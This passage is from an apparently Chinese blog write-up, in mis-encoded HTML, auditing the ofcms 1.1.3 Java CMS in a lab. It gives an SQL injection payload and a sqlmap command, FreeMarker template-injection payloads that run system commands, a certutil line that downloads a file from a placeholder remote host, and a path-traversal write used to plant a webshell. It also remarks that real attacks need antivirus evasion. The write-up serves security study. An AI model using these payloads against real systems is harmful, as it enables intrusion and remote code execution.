åˆ™ä¼šæŠ¥é”™ï¼Œä¿®æ”¹ä¸º <code>localhost</code> æ‰ä¸ä¼šæŠ¥é”™</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232111734.png" data-caption="image-20221019232111734"><img src="/../images/Java/ofcms/image-20221019232111734.png" alt="image-20221019232111734"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232345630.png" data-caption="image-20221019232345630"><img src="/../images/Java/ofcms/image-20221019232345630.png" alt="image-20221019232345630"></a></p><p>æˆåŠŸæ­å»º</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232502415.png" data-caption="image-20221019232502415"><img src="/../images/Java/ofcms/image-20221019232502415.png" alt="image-20221019232502415"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221019232519216.png" data-caption="image-20221019232519216"><img src="/../images/Java/ofcms/image-20221019232519216.png" alt="image-20221019232519216"></a></p><p>å°ç»“ï¼šè¿™ä¸€éƒ¨åˆ†çš„ç¯å¢ƒæ­å»ºå‘ç‚¹å¾ˆå¤šï¼Œä¸»è¦è¿˜æ˜¯å¡åœ¨ä¸€äº›å°ç»†èŠ‚ã€‚æ³¨æ„ï¼Œè§£å†³é‡è£…bugè®°å¾—è¦å…ˆæŠŠæ•°æ®åº“è¿æ¥åœ°å€æ”¹ä¸º <code>localhost</code>ï¼ˆé‡è¦ï¼‰ï¼Œç„¶åå®‰è£…ä¸€éï¼Œè®©æ•°æ®åº“ç”Ÿæˆç›¸åº”çš„è¡¨æ ¼ï¼Œç„¶åå°†<code>db-config.properties</code> æ”¹ä¸º <code>db.properties</code>ï¼Œç„¶åé‡æ–°è¿è¡Œå³å¯ã€‚</p><h2 id="ä¸‰ã€ä»£ç å®¡è®¡"><a href="#ä¸‰ã€ä»£ç å®¡è®¡" class="headerlink" title="ä¸‰ã€ä»£ç å®¡è®¡"></a>ä¸‰ã€ä»£ç å®¡è®¡</h2><h3 id="1ã€æºç åˆ†æ"><a href="#1ã€æºç åˆ†æ" class="headerlink" title="1ã€æºç åˆ†æ"></a>1ã€æºç åˆ†æ</h3><p>å¼€å§‹å®¡è®¡å‰ï¼Œå¤§æ¦‚äº†è§£ç¨‹åºæ¡†æ¶ï¼Œæ•´ä¸ªç¨‹åºä¸€å…±æœ‰äº”ä¸ªæ¨¡å—ç»„æˆï¼Œæ ¹æ®  <code>Readme</code> å¯çŸ¥å…¶å¯¹åº”çš„ä½œç”¨</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010225802.png" data-caption="image-20221020010225802"><img src="/../images/Java/ofcms/image-20221020010225802.png" alt="image-20221020010225802"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010344368.png" data-caption="image-20221020010344368"><img src="/../images/Java/ofcms/image-20221020010344368.png" alt="image-20221020010344368"></a></p><p>ç„¶åï¼Œæˆ‘ä»¬æŸ¥çœ‹ <code>pom.xml</code> ,<code>&lt;dependencies&gt;</code> éƒ¨åˆ†ï¼Œå³ä¾èµ–ã€‚åˆ†æå…¶ç¨‹åºä½¿ç”¨äº†å“ªäº›æ¡†æ¶ï¼Œæˆ–åº”ç”¨ç‰ˆæœ¬æ˜¯å“ªäº›ï¼Œå¯¹æˆ‘ä»¬åç»­å®¡è®¡æœ‰ä¸€å®šçš„ä½œç”¨ã€‚å¦‚ä¸‹ä¸º <code>ofcms v1.1.3</code> <code>pom.xml</code>æ–‡ä»¶ï¼Œä¾èµ–å¦‚ä¸‹ï¼Œç”±ä¿¡æ¯å¯çŸ¥ç¨‹åºä¿¡æ¯æœ‰ <code>jfinal</code> æ¡†æ¶ã€<code>slf4j</code> æ—¥å¿—æ¡†æ¶ã€<code>Apache</code> ä¸­é—´ä»¶ã€<code>springframework</code> æ¡†æ¶ã€<code>Druid 1.0.5</code>ã€<code>fastjson 1.1.41</code>ã€<code>log4j 1.2.16</code>ã€<code>mysql 5.1.47</code>ç­‰ä¿¡æ¯ï¼Œåç»­ä¹Ÿå¯ä»¥å¯¹è¯¥ç¨‹åºè¿›è¡Œå·²çŸ¥æ¼æ´çš„æµ‹è¯•</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010007868.png" data-caption="image-20221020010007868"><img src="/../images/Java/ofcms/image-20221020010007868.png" alt="image-20221020010007868"></a></p><p>é€šè¿‡æŸ¥çœ‹æºç å¾—çŸ¥ï¼Œç¨‹åºä½¿ç”¨äº† <code>tomcat</code> ï¼Œè€Œä»£ç å¯¹åº”å­˜åœ¨ <code>web.xml</code> é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ†æå…¶é…ç½®æ–‡ä»¶ï¼Œçœ‹æœ‰æ²¡æœ‰å…¶å®ƒçš„ä¿¡æ¯ã€‚ä¾‹å­ï¼šé€šè¿‡ <code>web.xml</code> å¾—çŸ¥ <code>druid</code> è·¯å¾„ä¸º <code>/admin/druid/</code>,è‹¥å­˜åœ¨æœªæˆæƒåˆ™å¯ä»¥è®¿é—®ï¼Œä½† <code>admin</code> è·¯å¾„ä¸ºåå°è·¯å¾„ï¼Œæ‰€ä»¥éœ€è¦ç™»å½•æ‰èƒ½è®¿é—®</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020010940740.png" data-caption="image-20221020010940740"><img src="/../images/Java/ofcms/image-20221020010940740.png" alt="image-20221020010940740"></a></p><p>å°è¯•è®¿é—® <code>/admin/druid/*</code>ï¼Œè·³è½¬è‡³ç™»å½•é¡µé¢</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020011132305.png" data-caption="image-20221020011132305"><img src="/../images/Java/ofcms/image-20221020011132305.png" alt="image-20221020011132305"></a></p><p>ç™»å½•åè®¿é—®ã€‚è¿™åªæ˜¯ä¸€ä¸ªä¾‹å­ï¼Œé€šè¿‡é…ç½®æ–‡ä»¶æ‰¾å¯»ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020011211309.png" data-caption="image-20221020011211309"><img src="/../images/Java/ofcms/image-20221020011211309.png" alt="image-20221020011211309"></a></p><p>ç„¶åæˆ‘ä»¬é€šè¿‡ä¸€ä¸‹æºç ï¼Œå¤§æ¦‚äº†è§£ç¨‹åºç»“æ„ï¼Œä»¥åŠç›¸åº”ä»£ç æ–‡ä»¶å¤¹çš„æºç ä½œç”¨æ˜¯å“ªäº›ï¼Œä¸€èˆ¬æˆ‘ä»¬æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸‹çš„ <code>/src/java</code> ç›®å½•ä¸‹çš„æºç å³å¯ã€‚<code>Controller</code> æºç å¯¹åº” <code>resources</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>Controller</code> åˆ†æå…¶è¯·æ±‚çŠ¶å†µï¼Œç„¶ååˆ° <code>resources</code> ä¸­æŸ¥çœ‹å…¶å…·ä½“ä»£ç ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020012651194.png" data-caption="image-20221020012651194"><img src="/../images/Java/ofcms/image-20221020012651194.png" alt="image-20221020012651194"></a></p><p>æœ€åï¼Œæ¯ä¸ªä»£ç é¡µé¢æµè§ˆä¸€ä¸‹ï¼Œé€šè¿‡ä»£ç ç»“æ„å’Œæ³¨é‡Šç­‰ä¿¡æ¯äº†è§£å¤§æ¦‚çš„ç»“æ„ã€‚åŸºæœ¬çŸ¥è¯†ç‚¹è¯·ç§»æ­¥ç«™å†…æ–‡ç« <a href="https://funsiooo.github.io/2022/10/02/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">ã€ŠJAVAä»£ç å®¡è®¡(ä¸‰)-åŸºç¡€çŸ¥è¯†ã€‹</a></p><h3 id="2ã€æ¼æ´å®¡è®¡"><a href="#2ã€æ¼æ´å®¡è®¡" class="headerlink" title="2ã€æ¼æ´å®¡è®¡"></a>2ã€æ¼æ´å®¡è®¡</h3><h4 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h4><p>è¿™é‡Œä½¿ç”¨ç™½ç›’æµ‹è¯•ï¼Œé€šè¿‡åˆ†æåæµ‹è¯•æ¼æ´ç‚¹ï¼Œ<code>åå°-ã€‹ä»£ç ç”Ÿæˆ-ã€‹</code>,éšä¾¿è¾“å…¥å­—ç¬¦ï¼ŒæŠ¥é”™</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020015034179.png" data-caption="image-20221020015034179"><img src="/../images/Java/ofcms/image-20221020015034179.png" alt="image-20221020015034179"></a></p><p>ä¸ºäº†æ˜¾ç¤ºå¾—æ›´ç›´è§‚ï¼Œè¿™é‡Œåˆ©ç”¨ Burp æŠ“åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020015121559.png" data-caption="image-20221020015121559"><img src="/../images/Java/ofcms/image-20221020015121559.png" alt="image-20221020015121559"></a></p><p>éªŒè¯æµ‹è¯• payloadï¼š<br><code>update+of_cms_link+set+link_name%3dupdatexml(1,concat(0x7e,(user())),0)+where+link_id+%3d+4</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020000529612.png" data-caption="image-20221020000529612"><img src="/../images/Java/ofcms/image-20221020000529612.png" alt="image-20221020000529612"></a></p><p>ç®€å•å¤ç°ï¼Œç¥­å‡ºç¥å™¨ Sqlmap  <code>python sqlmap.py -r ofcms.txt -p sql --level 3 --dbs</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020000923745.png" data-caption="image-20221020000923745"><img src="/../images/Java/ofcms/image-20221020000923745.png" alt="image-20221020000923745"></a></p><p>æ¼æ´åˆ†æï¼Œå®šä½æ¼æ´ä½ç½®æºç ã€‚é€šè¿‡ Burp ä¸­å‘ç° <code>referer ä¸­system/generate</code>ï¼Œæºç ä¸­å®šä½è¯¥ä»£ç æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021417891.png" data-caption="image-20221020021417891"><img src="/../images/Java/ofcms/image-20221020021417891.png" alt="image-20221020021417891"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020122144.png" data-caption="image-20221020020122144"><img src="/../images/Java/ofcms/image-20221020020122144.png" alt="image-20221020020122144"></a></p><p>å…¨å±€æœç´¢ï¼Œå®šä½ä»£ç ä½ç½®<br><code>\ofcms\ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SystemGenerateController.java</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020637848.png" data-caption="image-20221020020637848"><img src="/../images/Java/ofcms/image-20221020020637848.png" alt="image-20221020020637848"></a></p><p>å…¶ä¸­é€šè¿‡åˆ†æä»£ç ï¼Œå‘ç°æ¼æ´ç‚¹å‚æ•° <code>sql</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020851984.png" data-caption="image-20221020020851984"><img src="/../images/Java/ofcms/image-20221020020851984.png" alt="image-20221020020851984"></a></p><p>è·Ÿè¿› <code>getPara()</code> æ–¹æ³•ï¼ŒæŸ¥çœ‹å…·ä½“è¿”å›æ–¹å¼ï¼Œ <code>Ctrl + é¼ æ ‡å·¦é”®</code>ï¼Œç”±ä¸‹å›¾ä»£ç å¯çŸ¥ï¼Œç¨‹åºæ²¡æœ‰å¯¹ <code>sql</code> å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œ<code>getPara()</code> è¯·æ±‚åï¼Œç³»ç»Ÿç›´æ¥å°†è¿”å›è¯·æ±‚çš„å‚æ•°</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021029645.png" data-caption="image-20221020021029645"><img src="/../images/Java/ofcms/image-20221020021029645.png" alt="image-20221020021029645"></a></p><p>è‹¥ä¸çŸ¥é“æ¼æ´ç‚¹ï¼Œè¿›è¡Œæ¼æ´ç‚¹è¿½è¸ªå®šä½ä»£ç ã€‚æ¯”å¦‚æˆ‘ä»¬é€šè¿‡å®¡è®¡è¿½è¸ªä»£ç ï¼Œå‘ç°<code>/system/generate</code> è·¯å¾„ä¸‹ <code>sql</code> å‚æ•°æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥æ¼æ´</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020020851984.png" data-caption="image-20221020020851984"><img src="/../images/Java/ofcms/image-20221020020851984.png" alt="image-20221020020851984"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020021928106.png" data-caption="image-20221020021928106"><img src="/../images/Java/ofcms/image-20221020021928106.png" alt="image-20221020021928106"></a></p><p>æ ¹æ®ç°æœ‰ä¿¡æ¯ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œæ¼æ´ç‚¹å‚æ•°ä¸º <code>sql</code>ï¼Œè·¯å¾„ä¸º <code>/system/generate/</code>ï¼Œå‘ä¸Šè¿½è¸ªè·¯å¾„ä¸º <code>/admin/system/generate</code>ï¼Œç»¼åˆæ‰€å¾—ï¼Œé€šè¿‡ Burp ä»£ç†æŠ“åŒ…ï¼Œç‚¹å‡»åŠŸèƒ½ç‚¹ï¼ŒæŸ¥çœ‹å“ªä¸ªé¡µé¢ä¸º <code>/admin/system/generate</code> ä¸”å­˜åœ¨è¾“å…¥ç‚¹å‚æ•° <code>sql</code>ï¼Œåˆ™è¿›è¡Œæµ‹è¯•å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020022215661.png" data-caption="image-20221020022215661"><img src="/../images/Java/ofcms/image-20221020022215661.png" alt="image-20221020022215661"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221020022414193.png" data-caption="image-20221020022414193"><img src="/../images/Java/ofcms/image-20221020022414193.png" alt="image-20221020022414193"></a></p><h4 id="SSTIæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥"><a href="#SSTIæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥"></a>SSTIæœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥</h4><p>ç”± pom.xml ä¸­å‘ç°å­˜åœ¨ FreeMarker æ¨¡æ¿å¼•æ“çš„ä¾èµ–ï¼Œè¯¥æ¨¡æ¿å­˜åœ¨æ¨¡æ¿æ³¨å…¥,å°è¯•è¿›è¡Œå¤ç°</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021000447406.png" data-caption="image-20221021000447406"><img src="/../images/Java/ofcms/image-20221021000447406.png" alt="image-20221021000447406"></a></p><p>æ¼æ´ç‚¹ä¸ºæ¨¡æ¿æ–‡ä»¶å¤„</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002005057.png" data-caption="image-20221021002005057"><img src="/../images/Java/ofcms/image-20221021002005057.png" alt="image-20221021002005057"></a></p><p>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ¨¡æ¿æ–‡ä»¶å†…å®¹æ’å…¥æ¶æ„è¯­å¥ï¼Œè§¦å‘ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œã€‚å¦‚ä¸‹æ’å…¥æ¶æ„è¯­å¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä¿ƒä½¿å¼¹å‡ºè®¡ç®—å™¨</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;calc&quot;) &#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021003322351.png" data-caption="image-20221021003322351"><img src="/../images/Java/ofcms/image-20221021003322351.png" alt="image-20221021003322351"></a></p><p>ä¿å­˜åï¼Œè®¿é—®ä¸»é¡µè§¦å‘å‘½ä»¤ï¼Œå› ä¸ºç¼–è¾‘çš„æ¨¡æ¿ä¸ºä¸»é¡µæ ·å¼æ¨¡æ¿</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002215557.png" data-caption="image-20221021002215557"><img src="/../images/Java/ofcms/image-20221021002215557.png" alt="image-20221021002215557"></a></p><p>é€šè¿‡ Burp å®šä½åˆ°æ¼æ´ä»£ç ï¼Œ<code>/ofcms_admin_war/admin/cms/template</code> è·¯å¾„ä¸‹çš„ <code>file_content</code> å‚æ•°</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002555604.png" data-caption="image-20221021002555604"><img src="/../images/Java/ofcms/image-20221021002555604.png" alt="image-20221021002555604"></a></p><p>å¯¹åº”æ§åˆ¶å¤„ç†æ–¹æ³•ä¸º <code>com.ofsoft.cms.admin.controller.cms.TemplateController ç±»ä¸­çš„saveæ–¹æ³•</code>ï¼Œä»ä¸‹å›¾å¯ä»¥çœ‹å‡ºæ¥ï¼Œå…¶å®ä»£ç æœ‰å¯¹ <code>fileContent</code> å†…å®¹è¿›è¡Œæ›¿æ¢ï¼Œä½†æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œreplace() çš„ä½¿ç”¨æ–¹æ³•ä¸º <code>å­—ç¬¦ä¸².replace(String oldChar, String newChar)</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021002943097.png" data-caption="image-20221021002943097"><img src="/../images/Java/ofcms/image-20221021002943097.png" alt="image-20221021002943097"></a></p><p>æˆ‘ä»¬è·Ÿè¿› <code>getRequest()</code>æ–¹æ³• <code>Ctrl + é¼ æ ‡å·¦é”®</code>ï¼ŒæŸ¥çœ‹å…·ä½“è¿”å›,ç”±ä¸‹å›¾å¯çŸ¥ï¼Œç›´æ¥å¯¹è¿”å› <code>request</code> è¯·æ±‚ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021005342147.png" data-caption="image-20221021005342147"><img src="/../images/Java/ofcms/image-20221021005342147.png" alt="image-20221021005342147"></a></p><p>æ¼æ´åŸå› ä¸ºï¼š<code>FreeMarker</code> æä¾›é«˜çº§å†…ç½®å‡½æ•°ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ è¯­å¥å»å®ç°æ”»å‡»ï¼Œå…¶ä¸­å¼•æ“æ¨¡æ¿ä¸­å­˜åœ¨èƒ½å¤Ÿæ‰§è¡Œçš„ç±»æ˜¯ä¸»è¦èƒ½æ„é€ å‘½ä»¤æ‰§è¡Œçš„åŸå› ï¼Œå®˜æ–¹æ–‡æ¡£ <code>http://freemarker.foofun.cn/ref_builtins_expert.html</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012934815.png" data-caption="image-20221021012934815"><img src="/../images/Java/ofcms/image-20221021012934815.png" alt="image-20221021012934815"></a></p><p>ç”±äºæˆ‘è¿™é‡Œæ‰¾ä¸åˆ°å…·ä½“çš„ä»£ç ï¼Œæ‰€ä»¥å°±ä¸æ˜¾ç¤ºäº†ã€‚è´´å‡ºç½‘ä¸Šçš„payloadå¦‚ä¸‹</p><p>æ„é€ æ–¹æ³•ä¸€ï¼š<br><code>freemarker.template.utility</code> ä¸­çš„ <code>Execute ç±»</code> ,åˆ©ç”¨newå‡½æ•°æ–°å»ºä¸€ä¸ªExecuteç±»,ä¼ è¾“æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ä½œä¸ºå‚æ•°ï¼Œæ„é€ è¿œç¨‹å‘½ä»¤ã€‚ </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure></div><br/><p>æ„é€ æ–¹æ³•äºŒï¼š<br><code>freemarker.template.utility</code> ä¸­çš„ <code>ObjectConstructorç±»</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;</span><br></pre></td></tr></table></figure></div><br/><p>æ„é€ æ–¹æ³•ä¸‰ï¼š<br><code>freemarker.template.utility</code> ä¸­çš„ <code>JythonRuntimeç±»</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;/@value&gt;</span><br></pre></td></tr></table></figure></div><br/><p>å…·ä½“è¯­å¥è§£æï¼ŒåŸå§‹ï¼š<code>&lt;#assign word_wrapp = &quot;com.acmee.freemarker.WordWrapperDirective&quot;?new()&gt;</code>ï¼Œåˆ©ç”¨ <code>Execute</code> ç±»æ„é€ æ¶æ„è¯­å¥ <code>&lt;#assign xxx= &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;xxx(&quot;calc&quot;)&#125;</code>ï¼Œå…¶ä¸­xxxä¸ºç›¸åŒçš„å­—ç¬¦ï¼Œäº²æµ‹æ•°å­—ä¸èƒ½è§¦å‘è¯­å¥ï¼Œ<code>freemarker.template.utility.Execute</code> ä¸º freemarker æ¨¡æ¿å¼•æ“çš„</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021014155077.png" data-caption="image-20221021014155077"><img src="/../images/Java/ofcms/image-20221021014155077.png" alt="image-20221021014155077"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021014135817.png" data-caption="image-20221021014135817"><img src="/../images/Java/ofcms/image-20221021014135817.png" alt="image-20221021014135817"></a></p><p>å°è¯•åˆ©ç”¨ <code>certutil.exe</code> è¿œç¨‹ä¸‹è½½æ–‡ä»¶ï¼Œè¿œç¨‹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹åªæ˜¯123456ï¼Œä½†ç”±äºä½¿ç”¨äº† <code>certutil</code> å‘½ä»¤ï¼Œç³»ç»Ÿä¼šæ‹¦æˆª</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; </span><br><span class="line">  $&#123; ex(&quot;certutil -urlcache -split -f http://x.x.x.x:2333/ssti.txt ssti.exe&quot;) &#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012311523.png" data-caption="image-20221021012311523"><img src="/../images/Java/ofcms/image-20221021012311523.png" alt="image-20221021012311523"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012141523.png" data-caption="image-20221021012141523"><img src="/../images/Java/ofcms/image-20221021012141523.png" alt="image-20221021012141523"></a></p><p>æŠŠé˜²æŠ¤å…³äº†ä»¥åï¼Œä¼šä¸‹è½½åˆ° tomcat çš„ç›®å½•ä¸‹ã€‚æ‰€ä»¥å®æˆ˜ä¸­å¾—è€ƒè™‘ï¼Œç»•è¿‡ä¸»æœºé˜²æŠ¤è®¾å¤‡ï¼Œé©¬å„¿å¾—å…æ€</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021012506146.png" data-caption="image-20221021012506146"><img src="/../images/Java/ofcms/image-20221021012506146.png" alt="image-20221021012506146"></a></p><h4 id="ä»»æ„æ–‡ä»¶å†™å…¥"><a href="#ä»»æ„æ–‡ä»¶å†™å…¥" class="headerlink" title="ä»»æ„æ–‡ä»¶å†™å…¥"></a>ä»»æ„æ–‡ä»¶å†™å…¥</h4><p>æ¼æ´ç‚¹åŒæ ·åœ¨ <code>SSTI</code> æ¼æ´ä½ç½®ä¸­çš„ <code>save</code> å‡½æ•°ä¸­</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021020833483.png" data-caption="image-20221021020833483"><img src="/../images/Java/ofcms/image-20221021020833483.png" alt="image-20221021020833483"></a></p><p>é¦–å…ˆä»å‰å°è·å– <code>file_nameã€file_content</code> ä¸¤ä¸ªå‚æ•°ï¼Œè¯¥å‡½æ•°çš„ <code>file_name</code> æ˜¯ç›´æ¥å’Œ <code>pathfile</code> ç›®å½•æ‹¼æ¥ï¼Œå¯¼è‡´å¯ä»¥è·¯å¾„ç©¿è¶Šï¼Œæ–‡ä»¶å¯ä»¥å†™åˆ°ä»»æ„ä½ç½®</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021021122226.png" data-caption="image-20221021021122226"><img src="/../images/Java/ofcms/image-20221021021122226.png" alt="image-20221021021122226"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021021309015.png" data-caption="image-20221021021309015"><img src="/../images/Java/ofcms/image-20221021021309015.png" alt="image-20221021021309015"></a></p><p>è·å–æ¥å£</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021022029123.png" data-caption="image-20221021022029123"><img src="/../images/Java/ofcms/image-20221021022029123.png" alt="image-20221021022029123"></a></p><p>æ„é€ æŸ¥è¯¢</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021022429063.png" data-caption="image-20221021022429063"><img src="/../images/Java/ofcms/image-20221021022429063.png" alt="image-20221021022429063"></a></p><p>ä¸Šä¼  <code>Webshell</code> è‡³ <code>static</code> ç›®å½•</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021033127359.png" data-caption="image-20221021033127359"><img src="/../images/Java/ofcms/image-20221021033127359.png" alt="image-20221021033127359"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021033310849.png" data-caption="image-20221021033310849"><img src="/../images/Java/ofcms/image-20221021033310849.png" alt="image-20221021033310849"></a></p><h4 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h4><p>åœ¨ <code>ComnController.java</code> å’Œ <code>UeditorAction.java</code> æ–‡ä»¶ä¸‹å­˜åœ¨å¤šä¸ªä¸Šä¼ æ¥å£ï¼Œå…¶ä¸­ <code>upload</code>ã€<code>editUploadImage</code>ã€<code>uploadImage</code>ã€<code>uploadFile</code>ã€<code>uploadVideo</code> å’Œ <code>uploadScrawl</code> å‡½æ•°å‡ä½¿ç”¨äº†ï¼Œè¿™é‡Œç¯å¢ƒæ¥å£æœ‰é—®é¢˜ï¼Œå¯¼è‡´æ— æ³•ä¸Šä¼ å›¾ç‰‡ï¼Œæ‰€ä»¥å°±æ— æ³•å¤ç°</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021034750952.png" data-caption="image-20221021034750952"><img src="/../images/Java/ofcms/image-20221021034750952.png" alt="image-20221021034750952"></a><br><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021034529451.png" data-caption="image-20221021034529451"><img src="/../images/Java/ofcms/image-20221021034529451.png" alt="image-20221021034529451"></a></p><p>è·Ÿè¿›åæ²¡æœ‰å‘ç°è¿‡æ»¤ï¼Œç”±äºå‚è€ƒæ–‡ç« ä¸­èƒ½è·Ÿè¿›åˆ° <code>MultipartRequest</code> å‡½æ•°ä¸­å»ï¼Œè¿™é‡Œç”±äºç¬”è€…æ°´å¹³æœ‰é™ï¼ŒåŠ ä¸Šç¯å¢ƒä¹Ÿè®¸æœ‰ç‚¹é—®é¢˜ï¼Œå¯¼è‡´æ— æ³•è·Ÿè¿›åˆ°æœ€åï¼Œåç»­æœ‰æœºä¼šå†å­¦ä¹ ä¸€ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/Java/ofcms/image-20221021040448644.png" data-caption="image-20221021040448644"><img src="/../images/Java/ofcms/image-20221021040448644.png" alt="image-20221021040448644"></a></p><h2 id="å››ã€å‚è€ƒæ–‡ç« "><a href="#å››ã€å‚è€ƒæ–‡ç« " class="headerlink" title="å››ã€å‚è€ƒæ–‡ç« "></a>å››ã€å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://forum.butian.net/share/1229</span><br><span class="line">https://blog.csdn.net/Alexz__/article/details/116229266</span><br><span class="line">https://www.secpulse.com/archives/185233.html</span><br><span class="line">https://blog.csdn.net/YouthBelief/article/details/122978328</span><br><span class="line">https://www.cnblogs.com/Eleven-Liu/p/12747908.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> Javaä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Serviceæ¥å£æµ‹è¯•ä¹‹SOAP</title>
